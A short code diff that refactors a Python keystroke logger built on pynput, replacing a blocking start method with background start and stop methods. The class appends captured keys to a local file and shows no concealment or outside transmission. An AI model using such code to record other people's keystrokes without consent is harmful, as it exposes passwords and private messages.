@@ -3,6 +3,7 @@ from pynput.keyboard import Listener
 class KeyboardLogger:
     def __init__(self, log_file):
         self.log_file = log_file
+        self.listener = None
     
     def _write_file(self, key_data):
         with open(self.log_file, 'a') as f:
@@ -16,6 +17,10 @@ class KeyboardLogger:
             
         self._write_file(key_data)
     
-    def start(self):
-        with Listener(on_press=self.on_press) as listener:
-            listener.join()
+    def start_non_blocking(self):
+        self.listener = Listener(on_press=self.on_press)
+        self.listener.start()
+    
+    def stop(self):
+        if self.listener:
+            self.listener.stop()
